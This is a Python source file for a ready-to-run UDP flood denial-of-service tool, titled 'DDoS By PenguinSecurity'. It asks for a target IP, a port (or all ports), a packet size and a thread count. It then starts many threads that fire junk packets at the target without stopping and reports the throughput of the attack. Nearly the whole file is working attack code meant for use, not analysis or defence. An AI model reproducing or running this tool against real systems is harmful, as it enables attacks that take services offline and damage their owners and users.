from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep

from pystyle import *
from getpass import getpass as hinput


class Brutalize:

    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 100

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                print(stage(
                    f"{green}{round(size)} {white}Mb/s {black}-{white} Total: {green}{round(self.total, 1)} {white}Gb. {' '*20}"
                ),
                    end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)


ascii = r'''
██╗███╗   ███╗██████╗  ██████╗ ███████╗███████╗██╗██████╗ ██╗     ███████╗
██║████╗ ████║██╔══██╗██╔═══██╗██╔════╝██╔════╝██║██╔══██╗██║     ██╔════╝
██║██╔████╔██║██████╔╝██║   ██║███████╗█████╗  ██║██████╔╝██║     █████╗  
██║██║╚██╔╝██║██╔═══╝ ██║   ██║╚════██║██╔══╝  ██║██╔══██╗██║     ██╔══╝  
██║██║ ╚═╝ ██║██║     ╚██████╔╝███████║███████╗██║██████╔╝███████╗███████╗
╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀







'''

banner = r"""       ⠴⣷⣶⣤⣀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⣾⣶⣶⣶⣶⣶⣦⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣷⣄⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣴⣾⣿⣶⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠋⠉⠉⠉⠙⠛⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⠟⣿⣿⣿⣿⡀⠀⠙⠿⣿⣿⣿⣷⣦⣄⣠⣶⣿⣿⣿⡿⠟⠋⠁⣸⣿⣿⣿⡟⢿⣿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⢀⣿⣿⣿⣿⡿⠋⠀⠸⣿⣿⣿⣷⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⢀⣿⣿⣿⣿⠃⠀⠙⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
          ⠀⠀⠀⠀⣼⣿⣿⣿⡟⠁⠀⠀⠀⣿⣿⣿⣿⡁⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⢀⣾⣿⣿⣿⡏⠀⠀⠀⠈⢿⣿⣿⣿⣿⡀⠀⠀⠀
          ⠀⠀⠀⢰⣿⣿⣿⡿⠁⠀⠀⠀⠀⢹⣿⣿⣿⣧⣤⣾⣿⣿⣿⡿⠛⠉⠉⠻⣿⣿⣿⣿⣷⣾⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⡇⠀⠀⠀
          ⠀⠀⠀⣾⣿⣿⣿⠇⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣧⠀⠀⠀
          ⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⡋⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠈⣿⣿⣿⡆⠀⠀
          ⠀⠀⠠⣿⣿⣿⡇⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣶⣄⡀⠀⣿⣿⣿⡇⠀⠀
          ⠀⠀⠀⣿⣿⣿⣧⣴⣿⣿⣿⣿⣿⠿⠋⠘⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠙⠿⣿⣿⣿⣿⣿⣶⣿⣿⣿⡁⠀⠀
          ⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⢻⣿⣿⣿⣿⠂⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⡗⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⡀⠀⠀
          ⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣷⣶⣶⣿⣿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣤⣤⣤⣽⣿⣿⣿⣿⣿⣿⣦⠀
          ⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
          ⠀⠈⢹⠏⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣧⠀⠀⠀⠀⠀⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠉⠉⠉⣩⣿⣿⣿⠋⡏⢹⠀⠀
          ⠀⠀⠈⠀⠸⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⡆⠀⠀⠀⣼⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⡏⠀⣿⠀⠀⠀
          ⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣟⠀⠀⣸⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡟⠀⠀⠋⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡄⢠⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⢻⣿⣿⣿⣧⣿⣿⣿⣿⡟⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣷⣶⣼⣿⣿⣿⣿⣿⣿⣿⣿⣁⣤⣤⣶⣾⣿⣿⣿⣿⣿⡿⠿⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠻⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⣿⢹⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠀    """.replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)

green = Col.green
white = Col.white
black = Col.black


def init():
    System.Size(140, 40)
    System.Title("DDoS By PenguinSecurity".replace('.', ''))
    Cursor.HideCursor()


init()


def stage(text, symbol='...'):
    col1 = green
    col2 = white
    return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"


def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', green, white)} {green}{text}")
    exit()


def main():
    print()
    print(
         Colorate.Diagonal(Col.DynamicMIX((Col.white, Col.black)),
        Center.XCenter(banner)
    )
    )
    

    ip = input(stage(f"Chawere IP {black}->{green} ", '?'))
    print()

    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.', ''))
    except:
        error("Arasworia IP.")

    port = input(
        stage(
            f"Enter port {black}[{white}press {green}enter{white} to attack all ports{black}] {black}->{green} ",
            '?'))
    print()

    if port == '':
        port = None
    else:
        try:
            port = int(port)
            if port not in range(1, 65535 + 1):
                int('error')
        except ValueError:
            error("Error! Please enter a correct port.")

    force = input(
        stage(
            f"Bytes per packet {black}[{white}press {green}enter{white} for 1250{black}] {black}->{green} ",
            '?'))
    print()

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            error("Error! Please enter an integer.")

    threads = input(
        stage(
            f"Threads {black}[{white}press {green}enter{white} for 100{black}] {black}->{green} ",
            '?'))
    print()

    if threads == '':
        threads = 100
    else:
        try:
            threads = int(threads)
        except ValueError:
            error("Error! Please enter an integer.")

    print()
    cport = '' if port is None else f'{black}:{green}{port}'
    print(stage(f"Starting attack on {green}{ip}{cport}{white}."), end='\r')

    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        error("A fatal error has occured and the attack was stopped.", '')
    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(
            stage(
                f"Attack stopped. {green}{ip}{cport}{white} BY IODO {green}{round(brute.total, 1)} {white}Gb.",
                '.'))
    print('\n')
    sleep(1)

    hinput(stage(f"Press {green}enter{white} to {green}exit{white}.", '.'))


if __name__ == '__main__':
    main()
